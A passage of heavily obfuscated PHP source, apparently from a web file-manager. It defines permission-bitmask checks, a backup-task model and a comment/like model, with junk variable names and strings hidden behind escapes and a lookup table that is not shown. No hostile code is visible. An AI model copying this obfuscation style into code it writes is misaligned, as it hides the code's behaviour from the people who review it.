authCheckComment($¶„Ñ£›ã) { return self::authCheck($¶„Ñ£›ã, self::AUTH_COMMENT); } public static function authCheckEvent($ÛòÕî) { return self::authCheck($ÛòÕî, self::AUTH_EVENT); } public static function authCheckRoot($™«‰¦ƒ¶) { return self::authCheck($™«‰¦ƒ¶, self::AUTH_ROOT); } public static function authCheckAction($óî†ˆı, $Œ·âé†¢) { $Ñ­–š¼Ö =& $_SERVER[äô®•½Â]; $ƒ·ÜúëÏ = array($Ñ­–š¼Ö[1997] => self::AUTH_VIEW, $Ñ­–š¼Ö[1277] => self::AUTH_DOWNLOAD, $Ñ­–š¼Ö[110] => self::AUTH_UPLOAD, $Ñ­–š¼Ö[1947] => self::AUTH_EDIT, $Ñ­–š¼Ö[1225] => self::AUTH_REMOVE, $Ñ­–š¼Ö[1957] => self::AUTH_SHARE, $Ñ­–š¼Ö[440] => self::AUTH_COMMENT, $Ñ­–š¼Ö[1764] => self::AUTH_EVENT, $Ñ­–š¼Ö[1998] => self::AUTH_ROOT); if (!isset($ƒ·ÜúëÏ[$Œ·âé†¢])) { return; } $¼òŞ±¸° = $ƒ·ÜúëÏ[$Œ·âé†¢]; $óî†ˆı = intval($óî†ˆı); if ($óî†ˆı <= 0) { return !1; } if (($óî†ˆı & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($óî†ˆı & $¼òŞ±¸°); } public static function authDisable($†ÒãÊùÖ, $š†µ¼–Ü) { if (intval($†ÒãÊùÖ) <= 0) { return 0; } return intval($†ÒãÊùÖ) & ~$š†µ¼–Ü; } public $optionType = "\x53\x79\x73\164\145\155\x2e\163\x6f\x75\x72\143\x65\x41\x75\164\150\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\x61\165\x74\x68", "\x6c\x61\142\x65\154", "\144\x69\163\160\x6c\141\x79", "\x73\171\x73\x74\x65\155", "\x73\157\x72\x74"); public function initData() { $©âñæ¤¾ = $this->authDefault(); foreach ($©âñæ¤¾ as $Ó¹Òºõ°) { $this->add($Ó¹Òºõ°); } } public function findAuth($ÓÍ‚¢¨î, $¿ÂÓòÍ§) { $¾ø¯±§Å =& $_SERVER[äô®•½Â]; $»ÃÜ†Ì£ = parent::listData(); foreach ($»ÃÜ†Ì£ as $¨æğá¤) { $Ö†À¯ô = intval($¨æğá¤[$¾ø¯±§Å[498]]); if ($Ö†À¯ô <= 0 || $¨æğá¤[$¾ø¯±§Å[1999]] == 0) { continue; } if (($Ö†À¯ô & $ÓÍ‚¢¨î) != $ÓÍ‚¢¨î) { continue; } if (($Ö†À¯ô & $¿ÂÓòÍ§) != 0) { continue; } return $¨æğá¤[$¾ø¯±§Å[486]]; } return !1; } public function findAuthMax($ Û¡ŒÂ², $ì•õ•­ò) { $ÈÚ©ùŠÂ =& $_SERVER[äô®•½Â]; $ˆ˜ó÷Ä° = !1; $£˜„¹Ø– = parent::listData(); foreach ($£˜„¹Ø– as $˜¯Çõãˆ) { $­Şê× Š = intval($˜¯Çõãˆ[$ÈÚ©ùŠÂ[498]]); if ($­Şê× Š <= 0 || $˜¯Çõãˆ[$ÈÚ©ùŠÂ[1999]] == 0) { continue; } if (($­Şê× Š & $ Û¡ŒÂ²) != $ Û¡ŒÂ²) { continue; } if (($­Şê× Š & $ì•õ•­ò) != 0) { continue; } if (!$ˆ˜ó÷Ä°) { $ˆ˜ó÷Ä° = $˜¯Çõãˆ; continue; } if (intval($ˆ˜ó÷Ä°[$ÈÚ©ùŠÂ[498]]) < $­Şê× Š) { $ˆ˜ó÷Ä° = $˜¯Çõãˆ; } } return $ˆ˜ó÷Ä° ? $ˆ˜ó÷Ä°[$ÈÚ©ùŠÂ[486]] : !1; } public function findAuthReadOnly() { $œ¤‡§Ê = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $²Šæú¥Â = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($œ¤‡§Ê, $²Šæú¥Â); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $´È·ÍÃé =& $_SERVER[äô®•½Â]; $’í‹Ç‰ = parent::listData(); $òüíİŞä = !1; foreach ($’í‹Ç‰ as $¶‰”—º©) { if ($¶‰”—º©[$´È·ÍÃé[498]] <= 0 || $¶‰”—º©[$´È·ÍÃé[1999]] == $´È·ÍÃé[231]) { continue; } if (!$òüíİŞä) { $òüíİŞä = $¶‰”—º©; continue; } if ($òüíİŞä[$´È·ÍÃé[498]] > $¶‰”—º©[$´È·ÍÃé[498]]) { $òüíİŞä = $¶‰”—º©; } } return $òüíİŞä ? $òüíİŞä[$´È·ÍÃé[486]] : $´È·ÍÃé[12]; } public function listData($õø¶Òğ = false, $¹ìÏ€§ = "\x73\157\x72\x74", $ËÓ²ÔŞ• = false) { return parent::listData($õø¶Òğ, $¹ìÏ€§, $ËÓ²ÔŞ•); } public function update($îëñ–û, $åŠÁ²»ò) { $£œûõû¨ =& $_SERVER[äô®•½Â]; $‡â Ë²ù = parent::listData($îëñ–û); $½ïé¥–» = $this->findByName($åŠÁ²»ò[$£œûõû¨[32]]); if (!$‡â Ë²ù || $½ïé¥–» && $½ïé¥–»[$£œûõû¨[486]] != $‡â Ë²ù[$£œûõû¨[486]]) { return !1; } $this->filterAuth($åŠÁ²»ò[$£œûõû¨[498]]); return parent::update($îëñ–û, $åŠÁ²»ò); } public function remove($œ´ñåâß) { $· î©ï = parent::listData($œ´ñåâß); if (!$· î©ï || $· î©ï[$_SERVER[äô®•½Â][192]]) { return !1; } return parent::remove($œ´ñåâß); } public function add($›İÆ¹É˜ = array()) { $Ûñ¢£å =& $_SERVER[äô®•½Â]; if ($this->findByName($›İÆ¹É˜[$Ûñ¢£å[32]])) { return !1; } $Òº›Å’« = array($Ûñ¢£å[32] => $Ûñ¢£å[12], $Ûñ¢£å[498] => 1, $Ûñ¢£å[2000] => $Ûñ¢£å[1987], $Ûñ¢£å[1999] => 1, $Ûñ¢£å[192] => 0, $Ûñ¢£å[2001] => 0); $›İÆ¹É˜ = array_merge($Òº›Å’«, $›İÆ¹É˜); $›İÆ¹É˜[$Ûñ¢£å[2001]] = $this->getSort(); $this->filterAuth($›İÆ¹É˜[$Ûñ¢£å[498]]); return parent::insert($›İÆ¹É˜); } private function getSort() { $èö¿ğ™ç =& $_SERVER[äô®•½Â]; $†ŒÙ¢á¬ = parent::listData(); $ïÖëÊ¬Ë = array_to_keyvalue($†ŒÙ¢á¬, $èö¿ğ™ç[12], $èö¿ğ™ç[2001]); return empty($ïÖëÊ¬Ë) ? 0 : max($ïÖëÊ¬Ë) + 1; } private function filterAuth(&$Ìğ¾…¡) { if (!$Ìğ¾…¡) { return; } $”³«¦Á = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¼½ªŒš = array(); foreach ($”³«¦Á as $¢Õı„ñÒ) { if ($Ìğ¾…¡ & $¢Õı„ñÒ) { $¼½ªŒš[] = $¢Õı„ñÒ; } } if (in_array(self::AUTH_ROOT, $¼½ªŒš)) { $Ìğ¾…¡ = array_sum($”³«¦Á); return; } $‘¬ßõŸ¾ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¼½ªŒš as $¢Õı„ñÒ) { if (isset($‘¬ßõŸ¾[$¢Õı„ñÒ])) { $¼½ªŒš = array_merge($¼½ªŒš, $‘¬ßõŸ¾[$¢Õı„ñÒ]); } } $¼½ªŒš[] = self::AUTH_SHOW; $Ìğ¾…¡ = array_sum(array_unique($¼½ªŒš)); } public function sort($¿“ŒÂğ¥, $½—€Ì“¯) { return parent::update($¿“ŒÂğ¥, $½—€Ì“¯); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\142\141\x63\x6b\x75\160\114\x69\x73\164"; public $field = array("\151\157", "\x6e\141\x6d\145", "\x73\164\x61\164\x75\x73", "\143\x6f\156\x74\x65\x6e\164", "\x6d\141\x6e\x75\x61\x6c", "\162\x65\163\x75\154\x74", "\x74\151\x6d\145\x46\162\157\x6d", "\x74\x69\155\145\124\x6f"); public function config() { $àµ¸¬ìø =& $_SERVER[äô®•½Â]; Action($àµ¸¬ìø[2002])->taskInit(); $°Æ²Û¼Ÿ = Model($àµ¸¬ìø[836])->get($àµ¸¬ìø[843]); $°Æ²Û¼Ÿ = json_decode($°Æ²Û¼Ÿ, !0); $°Æ²Û¼Ÿ = is_array($°Æ²Û¼Ÿ) ? $°Æ²Û¼Ÿ : array(); $this->parseContent($°Æ²Û¼Ÿ); unset($°Æ²Û¼Ÿ[$àµ¸¬ìø[1746]]); Model($àµ¸¬ìø[1745])->cacheClear(); $ıƒ…íŒô = $àµ¸¬ìø[2003]; $úåÊ©¾Ã = Model($àµ¸¬ìø[2004])->findByKey($àµ¸¬ìø[1764], $ıƒ…íŒô); if (!$úåÊ©¾Ã) { $úåÊ©¾Ã = array(); } if (isset($úåÊ©¾Ã[$àµ¸¬ìø[207]])) { $úåÊ©¾Ã[$àµ¸¬ìø[207]] = json_decode($úåÊ©¾Ã[$àµ¸¬ìø[207]], !0); } if (isset($°Æ²Û¼Ÿ[$àµ¸¬ìø[207]])) { $úåÊ©¾Ã[$àµ¸¬ìø[207]][$àµ¸¬ìø[1749]] = $°Æ²Û¼Ÿ[$àµ¸¬ìø[207]]; unset($°Æ²Û¼Ÿ[$àµ¸¬ìø[207]]); } return array_merge($úåÊ©¾Ã, $°Æ²Û¼Ÿ); } public function listData($˜„€ÃÖÄ = false, $İÍ³Š¶÷ = "\155\x6f\144\x69\x66\171\124\151\x6d\x65", $ÇÑ—ŞÍá = false) { $´Âñí‚Ä = parent::listData($˜„€ÃÖÄ, $İÍ³Š¶÷, !0); if (!$´Âñí‚Ä) { return $´Âñí‚Ä; } if ($˜„€ÃÖÄ) { $´Âñí‚Ä = array($´Âñí‚Ä); } foreach ($´Âñí‚Ä as &$éå¦—ë) { $this->parseContent($éå¦—ë); } return $˜„€ÃÖÄ ? $´Âñí‚Ä[0] : $´Âñí‚Ä; } public function parseContent(&$Åšë’æ) { $°«¿„Éª =& $_SERVER[äô®•½Â]; $¥Ş®µÀà = _get($Åšë’æ, $°«¿„Éª[171], $°«¿„Éª[91]); if (!in_array($¥Ş®µÀà, array($°«¿„Éª[842], $°«¿„Éª[1204]))) { $Åšë’æ[$°«¿„Éª[171]] = $¥Ş®µÀà == $°«¿„Éª[91] ? $°«¿„Éª[1204] : $°«¿„Éª[842]; } } public function lastItem() { $·ÁÀó÷Ò = $this->listData(); return !empty($·ÁÀó÷Ò[0]) ? $·ÁÀó÷Ò[0] : null; } public function kill($€Š’±Ää) { $Ú·ÊïË =& $_SERVER[äô®•½Â]; $‹İ¸Áé† = $this->listData($€Š’±Ää); if (!$‹İ¸Áé† || empty($‹İ¸Áé†[$Ú·ÊïË[32]])) { return !0; } Task::kill($Ú·ÊïË[851]); Task::kill($Ú·ÊïË[870]); Task::kill($Ú·ÊïË[880]); $òÏÎ¢¬ = $‹İ¸Áé†[$Ú·ÊïË[32]]; $¾µœŒù = TEMP_FILES . $Ú·ÊïË[846] . $òÏÎ¢¬ . $Ú·ÊïË[8]; IO::remove($¾µœŒù, !1); return $this->remove($€Š’±Ää); } public function remove($½¸÷åù) { $âÁÄœà¿ = $this->listData($½¸÷åù); if (!$âÁÄœà¿) { return !0; } return $this->backupRemove($âÁÄœà¿); } private function backupRemove($‹¯ŠêŞ) { parent::remove($‹¯ŠêŞ[$_SERVER[äô®•½Â][486]]); $Õ³¤™Ìó = $this->backupPath($‹¯ŠêŞ); IO::remove($Õ³¤™Ìó, !1); return !0; } private function backupPath($¡ªıì–Ú) { $çë ½öş =& $_SERVER[äô®•½Â]; $ÄÚËğ” = $¡ªıì–Ú[$çë ½öş[32]]; $ƒûûı›É = Model($çë ½öş[836])->get($çë ½öş[837]); $­…Í¡³Ê = substr(md5($çë ½öş[838] . $ƒûûı›É . $ÄÚËğ”), 0, 8); return "\173\x69\157\x3a{$¡ªıì–Ú[$çë ½öş[817]]}\x7d\57\x64\141\164\141\142\141\x73\145\x2f\142\x61\143\153\165\160\x2f" . $ÄÚËğ” . $çë ½öş[11] . $­…Í¡³Ê; } public function start() { $š›÷œÚœ =& $_SERVER[äô®•½Â]; if ($GLOBALS[$š›÷œÚœ[6]][$š›÷œÚœ[92]][$š›÷œÚœ[2005]] != $š›÷œÚœ[91]) { return !0; } $‰Ÿ¥¸°ù = $this->config(); if (!$‰Ÿ¥¸°ù || $‰Ÿ¥¸°ù[$š›÷œÚœ[1746]] != $š›÷œÚœ[91]) { return !1; } if ($‰Ÿ¥¸°ù[$š›÷œÚœ[171]] == $š›÷œÚœ[842]) { $”¾ˆ’à¦ = Model($š›÷œÚœ[836])->get($š›÷œÚœ[1322]); if ($”¾ˆ’à¦ == $š›÷œÚœ[1323]) { $‰Ÿ¥¸°ù[$š›÷œÚœ[171]] = $š›÷œÚœ[1204]; } } $õ´âìºß = $this->process(); foreach ($õ´âìºß as $ĞË€åÚˆ) { if ($ĞË€åÚˆ) { return Task::restart($ĞË€åÚˆ[$š›÷œÚœ[486]]); } } $òÃä„…¤ = new Backup(); $îÓ‚¸ä = $òÃä„…¤->db(); if ($îÓ‚¸ä) { $îÓ‚¸ä = $òÃä„…¤->dbFile(); if ($îÓ‚¸ä && $‰Ÿ¥¸°ù[$š›÷œÚœ[171]] == $š›÷œÚœ[842]) { $îÓ‚¸ä = $òÃä„…¤->file(); } } Backup::set(array($š›÷œÚœ[815] => 1, $š›÷œÚœ[827] => time())); return !0; } public function process() { $Å¥»Ãäé =& $_SERVER[äô®•½Â]; $Ì»‰Ê’ = array($Å¥»Ãäé[823] => Task::get($Å¥»Ãäé[851]), $Å¥»Ãäé[828] => Task::get($Å¥»Ãäé[870]), $Å¥»Ãäé[233] => Task::get($Å¥»Ãäé[880])); $¼÷±¾Òá = !1; foreach ($Ì»‰Ê’ as &$ºÅÖ±İü) { if ($¼÷±¾Òá) { $ºÅÖ±İü = !1; continue; } if ($ºÅÖ±İü) { $ŠáÑ÷ô‰ = intval(_get($ºÅÖ±İü, $Å¥»Ãäé[1782], 0)); if (time() - $ŠáÑ÷ô‰ > 7200) { Task::kill($ºÅÖ±İü[$Å¥»Ãäé[486]]); $¼÷±¾Òá = !0; $ºÅÖ±İü = !1; } } } return $Ì»‰Ê’; } public function restore() { $Ù‡åâ­á =& $_SERVER[äô®•½Â]; ActionCall($Ù‡åâ­á[1132], !0, 1); ActionCall($Ù‡åâ­á[1132], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\x65\156\164"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\x6d\x65" => "\x63\x6f\x6d\x6d\x65\156\164\137\155\x65\x74\x61", "\155\x65\164\141\x46\x69\x65\x6c\144" => "\143\157\x6d\155\x65\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ı…ÍÆÔ) { $ÓÍÆ¡ƒ÷ =& $_SERVER[äô®•½Â]; if ($ı…ÍÆÔ[$ÓÍÆ¡ƒ÷[2006]]) { $ù£ĞÀ’ƒ = $this->where(array($ÓÍÆ¡ƒ÷[2007] => $ı…ÍÆÔ[$ÓÍÆ¡ƒ÷[2006]]))->find(); if (!$ù£ĞÀ’ƒ || $ù£ĞÀ’ƒ[$ÓÍÆ¡ƒ÷[191]] != $ı…ÍÆÔ[$ÓÍÆ¡ƒ÷[191]] || $ù£ĞÀ’ƒ[$ÓÍÆ¡ƒ÷[582]] != $ı…ÍÆÔ[$ÓÍÆ¡ƒ÷[582]]) { return !1; } $this->where(array($ÓÍÆ¡ƒ÷[2007] => $ı…ÍÆÔ[$ÓÍÆ¡ƒ÷[2006]]))->setAdd($ÓÍÆ¡ƒ÷[2008], 1); } $ı…ÍÆÔ[$ÓÍÆ¡ƒ÷[2009]] = 0; $ı…ÍÆÔ[$ÓÍÆ¡ƒ÷[2008]] = 0; $ı…ÍÆÔ[$ÓÍÆ¡ƒ÷[815]] = 1; return $this->add($ı…ÍÆÔ); } public function commentCount($úšÙœÉ, $ù¦¢ª’¾, $ŠäÑúÑ¸ = false) { $Í¾ ´¥‚ =& $_SERVER[äô®•½Â]; if (!$úšÙœÉ) { return array(); } if (is_string($úšÙœÉ) || is_int($úšÙœÉ)) { $úšÙœÉ = array($úšÙœÉ); } $àÚªèìï = array($Í¾ ´¥‚[582], $Í¾ ´¥‚[2010] => $Í¾ ´¥‚[578]); $™øøŞ¯ï = array($Í¾ ´¥‚[582] => array($Í¾ ´¥‚[7], $úšÙœÉ), $Í¾ ´¥‚[191] => $ù¦¢ª’¾); if ($ŠäÑúÑ¸) { $™øøŞ¯ï[$Í¾ ´¥‚[1777]] = $ŠäÑúÑ¸; } $ğšÊëü = $this->field($àÚªèìï)->where($™øøŞ¯ï)->group($Í¾ ´¥‚[582])->select(); return array_to_keyvalue($ğšÊëü, $Í¾ ´¥‚[582], $Í¾ ´¥‚[578]); } public function starTarget($Õ›¥œÇå, $òïñˆ°Ì) { $¢ó§àßØ =& $_SERVER[äô®•½Â]; $¾ªŞŞ˜Ê = $Õ›¥œÇå + self::TYPE_STAR_OFFSET; $—çÊåŞª = array($¢ó§àßØ[1777] => USER_ID, $¢ó§àßØ[191] => $¾ªŞŞ˜Ê, $¢ó§àßØ[582] => $òïñˆ°Ì); $‡Ô©²Óø = $this->where($—çÊåŞª)->find(); if ($‡Ô©²Óø) { return $this->where(array($¢ó§àßØ[486] => $‡Ô©²Óø[$¢ó§àßØ[486]]))->delete(); } $ì±§«ñ‰ = array($¢ó§àßØ[2006] => 0, $¢ó§àßØ[1777] => USER_ID, $¢ó§àßØ[815] => 1, $¢ó§àßØ[171] => $¢ó§àßØ[12], $¢ó§àßØ[191] => $¾ªŞŞ˜Ê, $¢ó§àßØ[582] => $òïñˆ°Ì, $¢ó§àßØ[2009] => 0, $¢ó§àßØ[2008] => 0); return $this->add($ì±§«ñ‰); } public function starTargetCount($şµ‘ÇòØ, $àÕò íï) { $Úï¿Ôİä =& $_SERVER[äô®•½Â]; $¡ßˆ˜ãê = $àÕò íï + self::TYPE_STAR_OFFSET; $Šû›Ö£€ = $this->commentCount($şµ‘ÇòØ, $¡ßˆ˜ãê); $ø”Æ—˜Ö = $this->commentCount($şµ‘ÇòØ, $¡ßˆ˜ãê, USER_ID); return array($Úï¿Ôİä[2011] => $Šû›Ö£€, $Úï¿Ôİä[2012] => $ø”Æ—˜Ö); } public function starTargetUserList($àç§¯‰, $®Ê“×Šå) { $±¦å¯¥Ğ =& $_SERVER[äô®•½Â]; $º˜¾¨–“ = $àç§¯‰ + self::TYPE_STAR_OFFSET; $ùÑØÕã¨ = array($±¦å¯¥Ğ[582] => $®Ê“×Šå, $±¦å¯¥Ğ[191] => $º˜¾¨–“); $Š„ùÃ®¿ = $this->where($ùÑØÕã¨)->count(); $¿¤½ôŠµ = array($±¦å¯¥Ğ[344] => $Š„ùÃ®¿, $±¦å¯¥Ğ[2013] => array()); if (!$Š„ùÃ®¿) { return $¿¤½ôŠµ; } $ó×–×Ú‰ = $this->field($±¦å¯¥Ğ[1777])->where($ùÑØÕã¨)->limit(500)->select(); $ó×–×Ú‰ = array_to_keyvalue($ó×–×Ú‰, $±¦å¯¥Ğ[12], $±¦å¯¥Ğ[1777]); $¿¤½ôŠµ[$±¦å¯¥Ğ[2013]] = Model($±¦å¯¥Ğ[590])->userListInfo($ó×–×Ú‰); return $¿¤½ôŠµ; } public function prasiseUserList($´¯íÎø›) { $à€ãø =& $_SERVER[äô®•½Â]; $´ áÒëõ = array($à€ãø[2014] => $´¯íÎø›); $…‰½ˆ„¦ = $this->where($´ áÒëõ)->find(); $êÍ·Ößï = _get($…‰½ˆ„¦, $à€ãø[2009], 0); $òÙ‘Îø¯ = array($à€ãø[344] => $êÍ·Ößï, $à€ãø[2013] => array()); if (!$êÍ·Ößï) { return $òÙ‘Îø¯; } $¿ÓØÃõÌ = Model($à€ãø[2015])->field($à€ãø[1777])->where($´ áÒëõ)->limit(500)->select(); $¿ÓØÃõÌ = array_to_keyvalue($¿ÓØÃõÌ, $à€ãø[12], $à€ãø[1777]); $òÙ‘Îø¯[$à€ãø[2013]] = Model($à€ãø[590])->userListInfo($¿ÓØÃõÌ); return $òÙ‘Îø¯; } public function remove($Ú²çÆ¢Ê) { $¼–í¤ÜÄ =& $_SERVER[äô®•½Â]; $ÙÇÁà˜ = array($¼–í¤ÜÄ[2007] => $Ú²çÆ¢Ê); $Û¾†Ï = $this->where($ÙÇÁà˜)->find(); if ($Û¾†Ï[$¼–í¤ÜÄ[2006]]) { $this->where(array($¼–í¤ÜÄ[2007] => $Û¾†Ï[$¼–í¤ÜÄ[2006]]))->setAdd($¼–í¤ÜÄ[2008], -1); } return $this->removeArray($Ú²çÆ¢Ê); } public function edit($·˜ÙÃİ¾, $óìÙşŸ) { $ÅÚŠåÛ½ =& $_SERVER[äô®•½Â]; $Şà»İï = array($ÅÚŠåÛ½[2007] => $·˜ÙÃİ¾); return $this->where($Şà»İï)->save(array($ÅÚŠåÛ½[2016] => $óìÙşŸ)); } public function prasise($¯¶ä÷±¢) { $şçı¯î =& $_SERVER[äô®•½Â]; $é¼î¸¶ñ = Model($şçı¯î[2017]); $¨¨çíƒ† = array($şçı¯î[2007] => $¯¶ä÷±¢, $şçı¯î[1768] => USER_ID); $Ğ¥úÈ¯ü = $é¼î¸¶ñ->where($¨¨çíƒ†)->find(); if (!$Ğ¥úÈ¯ü) { $é¼î¸¶ñ->add($¨¨çíƒ†); $…âÈÙóî = $this->where(array($şçı¯î[2007] => $¯¶ä÷±¢))->setAdd($şçı¯î[2009], 1); } else { $é¼î¸¶ñ->where($¨¨çíƒ†)->delete(); $…âÈÙóî = $this->where(array($şçı¯î[2007] => $¯¶ä÷±¢))->setAdd($şçı¯î[2009], -1); } return $…âÈÙóî; } public function targetInfo($Ş’Üœõ˜, $ˆó÷ñí ) { $ş…Çõ =& $_SERVER[äô®•½Â]; $çñ¶ÀÀ = array($ş…Çõ[664] => $Ş’Üœõ˜, $ş…Çõ[665] => $ˆó÷ñí ); $„”Ìäçé = $this->where($çñ¶ÀÀ)->count(); $‘—¬«â = "\x52\x49\107\x48\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x63\157\x6d\155\x65\x6e\x74\x5f\x70\162\x61\151\163\x65\40\163\164\141\162\x20\x6f\x6e\40\143\157\x6d\x6d\x65\x6e\x74\56\143\x6f\x6d\155\x65\x6e\164\x49\x44\40\75\x20\163\x74\x61\x72\56\x63\157\155\x6d\x65\156\x74\111\104"; $Ã©ìÖÉ = $this->alias($ş…Çõ[440])->where($çñ¶ÀÀ)->join($‘—¬«â, $ş…Çõ[2018])->count(); $ôôªï¬ = array($ş…Çõ[2019] => $„”Ìäçé, $ş…Çõ[2020] => $Ã©ìÖÉ); return $ôôªï¬; } public function listData($›¼ÌùÏ÷) { $¥˜êÈøÙ =& $_SERVER[äô®•½Â]; if (isset($›¼ÌùÏ÷[$¥˜êÈøÙ[2021]])) { if ($›¼ÌùÏ÷[$¥˜êÈøÙ[2021]]) { $›¼ÌùÏ÷[$¥˜êÈøÙ[2014]] = array($¥˜êÈøÙ[1086], intval($›¼ÌùÏ÷[$¥˜êÈøÙ[2021]])); } unset($›¼ÌùÏ÷[$¥˜êÈøÙ[2021]]); } if (isset($›¼ÌùÏ÷[$¥˜êÈøÙ[2022]])) { if ($›¼ÌùÏ÷[$¥˜êÈøÙ[2022]]) { $›¼ÌùÏ÷[$¥˜êÈøÙ[2014]] = array($¥˜êÈøÙ[1083], intval($›¼ÌùÏ÷[$¥˜êÈøÙ[2022]])); } unset($›¼ÌùÏ÷[$¥˜êÈøÙ[2022]]); } return $this->_listData($›¼ÌùÏ÷); } private function _listData($Æû‹çóÏ) { $¢ğ«­ =& $_SERVER[äô®•½Â]; $ˆôËİ«Â = $this->where($Æû‹çóÏ)->_makeOrder()->selectPage(100); $this->_listAppendParent($ˆôËİ«Â[$¢ğ«­[456]]); $this->_listAppendUser($ˆôËİ«Â[$¢ğ«­[456]]); $this->_listAppendMeta($ˆôËİ«Â[$¢ğ«­[456]]); return $ˆôËİ«Â; } private function _makeOrder() { $Êª…Á·‚ =& $_SERVER[äô®•½Â]; $Î‚»•øì = array($Êª…Á·‚[2009], $Êª…Á·‚[2008], $Êª…Á·‚[234]); $±à‘¤ú¼ = Input::get($Êª…Á·‚[541], $Êª…Á·‚[7], $Êª…Á·‚[508], $Î‚»•øì); $åÅíØÅˆ = Input::get($Êª…Á·‚[542], $Êª…Á·‚[7], $Êª…Á·‚[1770], array($Êª…Á·‚[2023], $Êª…Á·‚[537])); $–Í»Æú© = $±à‘¤ú¼ . $Êª…Á·‚[53] . $åÅíØÅˆ; return $this->order($–Í»Æú©); } private function _listAppendParent(&$ì€ô¸Ûö) { $ìğ±Å² =& $_SERVER[äô®•½Â]; $™ú‚ìè÷ = array_unique(array_to_keyvalue($ì€ô¸Ûö, $ìğ±Å²[12], $ìğ±Å²[2006])); $™ú‚ìè÷ = array_remove_value($™ú‚ìè÷, $ìğ±Å²[231]); if (!$™ú‚ìè÷) { return; } $Ó¹ËÆ“‚ = $this->where(array($ìğ±Å²[2007] => array($ìğ±Å²[7], $™ú‚ìè÷)))->select(); $Ó¹ËÆ“‚ = array_to_keyvalue($Ó¹ËÆ“‚, $ìğ±Å²[2014]); foreach ($ì€ô¸Ûö as &$è¶ïÄƒ) { if (isset($Ó¹ËÆ“‚[$è¶ïÄƒ[$ìğ±Å²[2006]]])) { $è¶ïÄƒ[$ìğ±Å²[2024]] = $Ó¹ËÆ“‚[$è¶ïÄƒ[$ìğ±Å²[2006]]]; } } unset($è¶ïÄƒ); } private function _listAppendUser(&$¼§İ•¢) { $˜Ó«öÛ… =& $_SERVER[äô®•½Â]; $¼Å‰œ = array_unique(array_to_keyvalue($¼§İ•¢, $˜Ó«öÛ…[12], $˜Ó«öÛ…[1777])); $¼Å‰œ = array_remove_value($¼Å‰œ, $˜Ó«öÛ…[231]); if (count($¼Å‰œ) == 0) { return; } foreach ($¼§İ•¢ as $îÁÕ°İ) { if (isset($îÁÕ°İ[$˜Ó«öÛ…[2024]])) { $¼Å‰œ[] = $îÁÕ°İ[$˜Ó«öÛ…[2024]][$˜Ó«öÛ…[1777]]; } } $Ûï§àÏ = Model($˜Ó«öÛ…[610])->userListInfo($¼Å‰œ); foreach ($¼§İ•¢ as &$îÁÕ°İ) { $îÁÕ°İ[$˜Ó«öÛ…[678]] = $Ûï§àÏ[$îÁÕ°İ[$˜Ó«öÛ…[1777]]]; if (isset($îÁÕ°İ[$˜Ó«öÛ…[2024]])) { $îÁÕ°İ[$˜Ó«öÛ…[2024]][$˜Ó«öÛ…[678]] = $Ûï§àÏ[$îÁÕ°İ[$˜Ó«öÛ…[2024]][$˜Ó«öÛ…[1777]]]; } } unset($îÁÕ°İ); } private function _listAppendMeta(&$òëîƒ…š) { $ı°ŸÜ‡½ =& $_SERVER[äô®•½Â]; $ÊÀ—¸„ı = array_unique(array_to_keyvalue($òëîƒ…š, $ı°ŸÜ‡½[12], $ı°ŸÜ‡½[2014])); $ÊÀ—¸„ı = array_remove_value($ÊÀ—¸„ı, $ı°ŸÜ‡½[231]); if (!$ÊÀ—¸„ı) { return; } foreach ($òëîƒ…š as $ÒŸ‡Æß—) { if (isset($ÒŸ‡Æß—[$ı°ŸÜ‡½[2024]])) { $ÊÀ—¸„ı[] = $ÒŸ‡Æß—[$ı°ŸÜ‡½[2024]][$ı°ŸÜ‡½[2014]]; } } $­§»Ù¿ = $this->metaList($ÊÀ—¸„ı); if (!$­§»Ù¿) { return !1; } foreach ($òëîƒ…š as &$ÒŸ‡Æß—) { $ÒŸ‡Æß—[$ı°ŸÜ‡½[552]] = $­§»Ù¿[$ÒŸ‡Æß—[$ı°ŸÜ‡½[2014]]]; if (isset($ÒŸ‡Æß—[$ı°ŸÜ‡½[2024]])) { $ÒŸ‡Æß—[$ı°ŸÜ‡½[2024]][$ı°ŸÜ‡½[552]] = $­§»Ù¿[$ÒŸ‡Æß—[$ı°ŸÜ‡½[2024]][$ı°ŸÜ‡½[2014]]]; } } unset($ÒŸ‡Æß—); } private function metaList($™£Ñ»±å) { $¾Ëüâû“ =& $_SERVER[äô®•½Â]; if (!$™£Ñ»±å) { return array(); } $Òë²“®¬ = array($¾Ëüâû“[2014] => array($¾Ëüâû“[7], $™£Ñ»±å)); $¡¾ï‡¨ï = Model($¾Ëüâû“[2025])->where($Òë²“®¬)->select(); $¡¾ï‡¨ï = array_to_keyvalue_group($¡¾ï‡¨ï, $¾Ëüâû“[2014]); foreach ($¡¾ï‡¨ï as $—¦»´Ç => $ÅóàÅÑ€) { $×­¶Ëœğ = array(); foreach ($ÅóàÅÑ€ as $™ò¡¿ãş) { $×­¶Ëœğ[$™ò¡¿ãş[$¾Ëüâû“[97]]] = $™ò¡¿ãş[$¾Ëüâû“[461]]; } 